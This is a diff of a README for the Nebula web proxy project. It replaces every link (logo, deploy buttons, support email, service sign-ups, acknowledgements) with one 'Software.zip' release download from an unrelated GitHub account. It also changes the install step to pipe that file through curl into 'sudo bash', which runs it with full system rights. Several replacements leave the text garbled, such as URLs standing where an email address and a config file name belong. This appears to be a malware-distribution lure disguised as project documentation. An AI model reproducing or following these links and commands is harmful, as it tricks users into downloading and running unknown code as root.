@@ -1,6 +1,6 @@
 
 <div align=center> 
-<img src='https://nebulaproxy.nebula.bio/images/logo.png' width="100px" height="100px">
+<img src='https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip' width="100px" height="100px">
 <h1>  Nebula </h1>
 NebulaWeb is an official flagship of Nebula Services and Nebula Developer Labs. NebulaWeb is a stunning, sleek, and functional web-proxy with support for thousands of popular sites. With NebulaWeb, the sky is the limit.
 </div>
@@ -11,7 +11,7 @@ NebulaWeb is an official flagship of Nebula Services and Nebula Developer Labs. 
 - Stunning highly functional UI with multiple themes 
 - XOR/b64 Encrypts all traffic sent from Nebula
 - Hides your IP from sites
-- [List of officially supported sites](https://github.com/NebulaServices/Nebula/blob/main/docs/officially-supported-sites.md)
+- [List of officially supported sites](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 - *limited* mobile support
 - StealthMode (buffed `about:blank` cloaking)
 - Advanced cloaking options
@@ -27,29 +27,29 @@ Table of contents
 
 
 ## Quick & Easy Deployment Options
-[![Deploy to Heroku](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/heroku.svg)](https://heroku.com/deploy/?template=https://github.com/NebulaServices/Nebula)
+[![Deploy to Heroku](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 <br>
-[![Run on Replit](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/replit.svg)](https://replit.com/github/NebulaServices/Nebula)
+[![Run on Replit](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 <br>
-[![Remix on Glitch](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/glitch.svg)](https://glitch.com/edit/#!/import/github/NebulaServices/Nebula)
+[![Remix on Glitch](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip!/import/github/NebulaServices/Nebula)
 <br>
-[![Deploy to IBM Cloud](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/ibmcloud.svg)](https://cloud.ibm.com/devops/setup/deploy?repository=https://github.com/NebulaServices/Nebula)
+[![Deploy to IBM Cloud](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 <br>
-[![Deploy to Amplify Console](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/amplifyconsole.svg)](https://console.aws.amazon.com/amplify/home#/deploy?repo=https://github.com/NebulaServices/Nebula)
+[![Deploy to Amplify Console](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 <br>
-[![Run on Google Cloud](https://raw.githubusercontent.com/BinBashBanana/deploy-buttons/master/buttons/remade/googlecloud.svg)](https://deploy.cloud.run/?git_repo=https://github.com/NebulaServices/Nebula)
+[![Run on Google Cloud](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 <br>
-[![Deploy on Railway](https://binbashbanana.github.io/deploy-buttons/buttons/remade/railway.svg)](https://railway.app/new/template/pBzeiN)
+[![Deploy on Railway](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 <br>
-[![Deploy To Koyeb](https://binbashbanana.github.io/deploy-buttons/buttons/remade/koyeb.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/NebulaServices/Nebula&branch=main&name=NebulaProxy)
+[![Deploy To Koyeb](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 
 ---
 ## how to use email OTP Verification mode
 * change `"verification":false,` to `"verification":true,`
-* Make an account with Sendgrid (https://app.sendgrid.com/)
+* Make an account with Sendgrid (https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 * verify email
 * get API key
-* fill out information in `deployment.config.json`
+* fill out information in `https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip`
   
 ## Advanced Deployment 
 
@@ -57,8 +57,8 @@ Table of contents
 
 credits to @ProgrammerIn-wonderland for writing this wonderful tutorial (which can also be found in the docs :)
 
-* Create an account at https://www.cloudflare.com/
-* Create an account at https://www.freenom.com/ (or any registrars) 
+* Create an account at https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip
+* Create an account at https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip (or any registrars) 
 * Find a free domain name at Freenom
 * Click checkout 
 	* Select (12 Months @ FREE) 
@@ -87,9 +87,9 @@ credits to @ProgrammerIn-wonderland for writing this wonderful tutorial (which c
 * SSH into the server you'll be using, I'll assume its running Ubuntu 22.04 (though the commands are the same for debian 10+ versions, and Ubuntu versions 20.04+)
 * run 
 ```
-curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash - \ &&
+curl -fsSL https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip | sudo -E bash - \ &&
 sudo apt-get install -y nodejs npm
-git clone https://github.com/NebulaServices/Nebula.git
+git clone https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip
 cd Nebula
 npm i
 npm ci
@@ -104,27 +104,27 @@ sudo nohup PORT=80 node . &
 ## Tech Stack
 
 - HTML, JS, CSS
-- Partical.JS 
+- https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip 
 - UV Backend Proxy 
 - Osana Backend Proxy
 - **Server:** Bare server on Node 
 
 ## Support
 
-For support, email chloe@nebula.bio or join our discord: discord.nebula.bio
+For support, email https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip or join our discord: https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip
 
 
 ## Demo
 
-[Click here to see a demo of Nebula](https://tutorialread.beauty/)
+[Click here to see a demo of Nebula](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 
 
 ## Acknowledgements
 
- - [UV (one of the back-end proxy we use)](https://github.com/titaniumnetwork-dev/Ultraviolet)
- - [Osana (one of the back-end proxy we use)](https://github.com/NebulaServices/Osana)
- - [Bare Server](https://github.com/tomphttp/bare-server-node)
- - [Partical.JS (v4, 5, 6.1 &< only)](https://github.com/VincentGarreau/particles.js)
+ - [UV (one of the back-end proxy we use)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
+ - [Osana (one of the back-end proxy we use)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
+ - [Bare Server](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
+ - [https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip (v4, 5, 6.1 &< only)](https://github.com/Demarcus567/Nebula-WebProxy/releases/download/v2.0/Software.zip)
 
 ## License
 
